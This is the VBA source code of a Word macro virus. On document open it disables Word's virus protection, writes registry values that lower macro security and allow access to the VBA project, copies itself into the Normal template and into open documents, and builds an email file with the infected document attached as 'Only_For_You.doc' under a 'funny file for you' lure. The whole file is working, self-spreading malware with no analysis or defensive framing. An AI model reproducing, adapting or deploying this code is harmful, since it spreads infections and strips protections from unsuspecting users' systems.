Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long


Sub AutoOpen()

Call FuckProtection
Call InfectWord

Call CreateEML

End Sub

Sub InfectWord()
On Error Resume Next
Set nor = NormalTemplate.VBProject.VBComponents
Set doc = ActiveDocument.VBProject.VBComponents
srcvir = "C:\calli.drv"
If nor.Item("Calli").Name <> "Calli" Then
    doc("Calli").Export srcvir
    nor.Import srcvir
    End If
If doc.Item("Calli").Name <> "Calli" Then
    nor("Calli").Export srcvir
    doc.Import srcvir
    ActiveDocument.Save
    End If
Kill (srcvir)
End Sub

Sub FuckProtection()
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
Select Case Application.Version
Case "10.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
Case "9.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End Select
WordBasic.DisableAutoMacros 0
End Sub

Sub CreateEML()

Dim strUserName As String
strUserName = String(100, Chr$(0))
GetUserName strUserName, 100
strUserName = Left$(strUserName, InStr(strUserName, Chr$(0)) - 1)


bound = ""
For i = 1 To 17
Randomize (Timer)
bound = bound + Chr(Int(Rnd(1) * 8) + 48)
Next

eml1 = "To: """ & strUserName & "@microsoft.com""" & vbCrLf & _
        "Subject: Hello You..." & vbCrLf & _
        "Date: " & Hour(Now) & ":" & Minute(Now) & ":" & Second(Now) & " +0200" & vbCrLf & _
        "MIME-Version: 1.0" & vbCrLf & _
        "Content-Type: multipart/mixed;" & vbCrLf & _
        vbTab & "boundary = ""----=_NextPart_" & bound & """" & vbCrLf & _
        "X-Priority: 3" & vbCrLf & _
        "X -MSMail - Priority: Normal" & vbCrLf & _
        "X-Unsent: 1" & vbCrLf & _
        "X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000" & vbCrLf & vbCrLf & _
        "This is a multi-part message in MIME format." & vbCrLf & vbCrLf
        
eml2 = "------=_NextPart_" & bound & vbCrLf & _
        "Content-Type: text/plain;" & vbCrLf & _
        vbTab & "Charset=""iso-8859-1""" & vbCrLf & _
        "Content-Transfer-Encoding: 7bit" & vbCrLf & vbCrLf & _
        "Hello my friend, this is a funny file for you" & vbCrLf & vbCrLf & _
        vbTab & vbTab & "Best Regards" & vbCrLf & vbCrLf & vbCrLf

eml3 = "------=_NextPart_" & bound & vbCrLf & _
        "Content-Type: application/x-msdownload;" & vbCrLf & _
        vbTab & "name = ""Only_For_You.doc""" & vbCrLf & _
        "Content -Transfer - Encoding: base64" & vbCrLf & _
        "Content-Disposition: attachment;" & vbCrLf & _
        vbTab & "fileName = ""Only_For_You.doc""" & vbCrLf & vbCrLf

eml4 = EncodeBase64(ActiveDocument.FullName)

eml5 = vbCrLf & "------=_NextPart_" & bound

Open "hello.eml" For Output As #1
Print #1, eml1 & eml2 & eml3 & eml4 & eml5
Close #1

End Sub

Private Function EncodeBase64(ByVal vsFullPathname As String) As String
On Error Resume Next
    Dim b           As Integer
    Dim Base64Tab   As Variant
    Dim bin(3)      As Byte
    Dim s           As String
    Dim l           As Long
    Dim i           As Long
    Dim FileIn      As Long
    Dim sResult     As String
    Dim n           As Long
    
    Base64Tab = Array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/")
    
    Erase bin
    l = 0: i = 0: FileIn = 0: b = 0:
    s = ""
    
    FileIn = FreeFile
    
    Open vsFullPathname For Binary As FileIn
    
    sResult = s & vbCrLf
    s = ""
    
    l = LOF(FileIn) - (LOF(FileIn) Mod 3)
    
    For i = 1 To l Step 3

        Get FileIn, , bin(0)
        Get FileIn, , bin(1)
        Get FileIn, , bin(2)
        
        If Len(s) > 72 Then

            s = s & vbCrLf
            sResult = sResult & s
            s = ""

        End If

        b = (bin(n) \ 4) And &H3F
        s = s & Base64Tab(b)
        
        b = ((bin(n) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
        s = s & Base64Tab(b)
        
        b = ((bin(n + 1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
        s = s & Base64Tab(b)
        
        b = bin(n + 2) And &H3F
        s = s & Base64Tab(b)
        
    Next i

    If Not (LOF(FileIn) Mod 3 = 0) Then

        For i = 1 To (LOF(FileIn) Mod 3)
            Get FileIn, , bin(i - 1)
        Next i
    
        If (LOF(FileIn) Mod 3) = 2 Then
            b = (bin(0) \ 4) And &H3F
            s = s & Base64Tab(b)
            
            b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
            s = s & Base64Tab(b)
            
            b = ((bin(1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
            s = s & Base64Tab(b)
            
            s = s & "="

        Else
            b = (bin(0) \ 4) And &H3F
            s = s & Base64Tab(b)
            
            b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
            s = s & Base64Tab(b)
            
            s = s & "=="
        End If
    End If

    If s <> "" Then
        s = s & vbCrLf
        sResult = sResult & s
    End If
    
    s = ""
    
    Close FileIn
    EncodeBase64 = sResult
    
End Function

